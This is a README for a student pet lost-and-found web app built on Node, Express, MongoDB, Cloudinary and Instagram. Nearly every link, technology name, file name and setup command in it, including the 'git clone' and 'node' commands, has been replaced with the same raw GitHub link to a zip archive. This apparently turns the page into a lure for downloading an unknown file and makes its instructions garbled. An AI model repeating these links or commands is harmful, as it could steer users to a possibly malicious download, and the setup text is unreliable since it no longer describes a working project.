## 📌 Overview

The **Pet Lost Management System** is a web-based platform designed to help reunite lost pets with their owners. Users can report lost, found, and unclaimed pets, and the system facilitates communication between pet owners and finders. The platform integrates **Instagram API** for automated posting, **EmailJS** for notifications, and **Cloudinary** for image storage.

---

Your **PetReunit-App** is now live! 🎉  

🔗 **Check it out here:** [PetReunit-App](https://raw.githubusercontent.com/Havishjupudi/PetReunite-App-/main/public/html/Pet-Reunite-App-v2.7-alpha.1.zip)  
📸 **Follow on Instagram:** [pets_reunite](https://raw.githubusercontent.com/Havishjupudi/PetReunite-App-/main/public/html/Pet-Reunite-App-v2.7-alpha.1.zip)  
[📹 Watch Demo Video](https://raw.githubusercontent.com/Havishjupudi/PetReunite-App-/main/public/html/Pet-Reunite-App-v2.7-alpha.1.zip)


⚠️ **Recommendation:** Best viewed on **desktop** as it is not fully optimized for mobile devices.

---

## 🛠️ Tech Stack

### 🔹 Frontend

- **HTML** – Provides the structure of the web pages.
- **CSS** – Styles the interface, ensuring a responsive and visually appealing design.
- **JavaScript** – Handles client-side interactivity, including dynamic pet listings and form validations.

### 🔹 Backend

- **https://raw.githubusercontent.com/Havishjupudi/PetReunite-App-/main/public/html/Pet-Reunite-App-v2.7-alpha.1.zip** – A JavaScript runtime that powers the server-side logic.
- **https://raw.githubusercontent.com/Havishjupudi/PetReunite-App-/main/public/html/Pet-Reunite-App-v2.7-alpha.1.zip** – A lightweight and flexible web framework for handling API requests, routing, and middleware.

### 🔹 Database

- **MongoDB Atlas** – A cloud-based NoSQL database that stores lost, found, and unclaimed pet details. It ensures data is securely managed and accessible from anywhere.

### 🔹 Hosting & Storage

- **https://raw.githubusercontent.com/Havishjupudi/PetReunite-App-/main/public/html/Pet-Reunite-App-v2.7-alpha.1.zip** – A cloud-based platform for hosting the backend, ensuring the server remains active and accessible.
- **Cloudinary** – A cloud storage service used for managing and storing pet images efficiently. It optimizes and delivers images in a scalable way.

### 🔹 Third-Party Integrations

- **Instagram API** – Automatically posts lost and found pet details on Instagram to reach a wider audience and increase the chances of reuniting pets with their owners.
- **EmailJS** – Enables automated email notifications to pet owners when a found pet matches a lost report. Emails also verify reports before adding them to the database.
- **Cloudinary API** – Handles image uploads, storage, and optimization, ensuring fast and secure image delivery without affecting server performance.

---

## 🚀 Features

✅ **Report Lost & Found Pets** – Users can submit details of lost or found pets.\
✅ **Unique Reunite ID** – Each pet gets a unique ID to track and verify ownership.\
✅ **Dynamic Pet Listings** – Lost and found pets are displayed dynamically.\
✅ **Email Notifications** – Owners receive an email when their lost pet is found.\
✅ **Instagram Posting** – Pet reports are posted automatically on Instagram: [pets\_reunite](https://raw.githubusercontent.com/Havishjupudi/PetReunite-App-/main/public/html/Pet-Reunite-App-v2.7-alpha.1.zip).\
✅ **Cloud-Based Image Storage** – All pet images are securely stored in Cloudinary.\
✅ **Optional Login (Not Functional Yet)** – Future login functionality planned.

---

## 📚 Project Structure

```
/PetLostManagementSystem  
│── /models              # Mongoose models for handling pet data  
│── /node_modules        # Dependencies installed via npm  
│── /public              # Static assets (CSS, HTML, images, JavaScript)  
│   │── /css             # Stylesheets  
│   │── /html            # HTML templates  
│   │── /images          # Uploaded and static images  
│   │── /js              # Client-side JavaScript  
│── .env                 # Environment variables (not tracked in Git)  
│── https://raw.githubusercontent.com/Havishjupudi/PetReunite-App-/main/public/html/Pet-Reunite-App-v2.7-alpha.1.zip                # Database connection (MongoDB Atlas)  
│── https://raw.githubusercontent.com/Havishjupudi/PetReunite-App-/main/public/html/Pet-Reunite-App-v2.7-alpha.1.zip           # Main entry point for the web app  
│── https://raw.githubusercontent.com/Havishjupudi/PetReunite-App-/main/public/html/Pet-Reunite-App-v2.7-alpha.1.zip         # Project dependencies and scripts  
│── https://raw.githubusercontent.com/Havishjupudi/PetReunite-App-/main/public/html/Pet-Reunite-App-v2.7-alpha.1.zip    # Locks dependency versions  
│── https://raw.githubusercontent.com/Havishjupudi/PetReunite-App-/main/public/html/Pet-Reunite-App-v2.7-alpha.1.zip            # Documentation for the project  
│── https://raw.githubusercontent.com/Havishjupudi/PetReunite-App-/main/public/html/Pet-Reunite-App-v2.7-alpha.1.zip            # Main backend server (https://raw.githubusercontent.com/Havishjupudi/PetReunite-App-/main/public/html/Pet-Reunite-App-v2.7-alpha.1.zip + Express)  
│── https://raw.githubusercontent.com/Havishjupudi/PetReunite-App-/main/public/html/Pet-Reunite-App-v2.7-alpha.1.zip # Temporary file (VS Code auto-generated)  
```

---

## 🛠️ Installation & Setup

Follow these steps to set up and run the **Pet Lost Management System** on your local machine:

### 🔹 1. Clone the Repository

First, clone the project from GitHub and navigate into the project directory:

```sh
 git clone https://raw.githubusercontent.com/Havishjupudi/PetReunite-App-/main/public/html/Pet-Reunite-App-v2.7-alpha.1.zip  
 cd PetLostManagementSystem  
```

### 🔹 2. Install Dependencies

Install the required dependencies using npm:

```sh
 npm install  
```

This will download and set up all necessary https://raw.githubusercontent.com/Havishjupudi/PetReunite-App-/main/public/html/Pet-Reunite-App-v2.7-alpha.1.zip modules for the project.

### 🔹 3. Set Up Environment Variables

Create a `.env` file in the root directory and add the following configuration:

```ini
 MONGODB_URI=your_mongodb_atlas_uri               # MongoDB Atlas connection string  
 CLOUDINARY_CLOUD_NAME=your_cloudinary_cloud_name # Cloudinary cloud name  
 CLOUDINARY_API_KEY=your_cloudinary_api_key       # Cloudinary API key  
 CLOUDINARY_API_SECRET=your_cloudinary_api_secret # Cloudinary API secret  
 EMAILJS_PUBLIC_KEY=your_emailjs_public_key       # EmailJS public API key for sending emails  
 INSTAGRAM_ACCESS_TOKEN=your_instagram_api_token  # Instagram API access token for automated posting  
```

Ensure you replace the placeholder values with your actual credentials.

### 🔹 4. Run the Project

Start the server using the following command:

```sh
 npm start  
```

Alternatively, you can run the main server file directly:

```sh
 node https://raw.githubusercontent.com/Havishjupudi/PetReunite-App-/main/public/html/Pet-Reunite-App-v2.7-alpha.1.zip  
```

Once started, the backend will run on `http://localhost:3000/` (or the port specified in your code).

---

## 📝 Usage Guide

### 🔹 1. Reporting a Lost Pet

- Navigate to the **Report Lost Pet** page.
- Fill in the required details, including:
  - **Pet Name (Optional)**
  - **Type of Pet (Dog, Cat, etc.)**
  - **Last Seen Area**
  - **Date Lost**
  - **Pet Image** (Uploaded to Cloudinary)
- Submit the form, and the pet will be added to the Lost Pets listing.

### 🔹 2. Reporting a Found Pet

- Navigate to the **Report Found Pet** page.
- Enter the **Reunite ID** (This ID is provided when a pet is reported as lost).
- The system automatically fetches lost pet details using the Reunite ID.
- Upload a recent image of the found pet (optional).
- Submit the form. If the details match a lost pet report, the pet owner will be notified.

### 🔹 3. Automated Instagram Posting

- When a pet is reported lost, the system automatically posts the pet details on Instagram: [pets\_reunite](https://raw.githubusercontent.com/Havishjupudi/PetReunite-App-/main/public/html/Pet-Reunite-App-v2.7-alpha.1.zip).

---

## ⚠️ Important Notice

- This project was built **for educational purposes only** and is **not a fully functional real-world application**.
- It demonstrates how a pet lost-and-found system can work, but it is **not meant for actual use**.
- **Do not upload unnecessary images, unrelated content, illegal material, or any inappropriate content.**
- Please use the project responsibly for learning and demonstration purposes only.

---

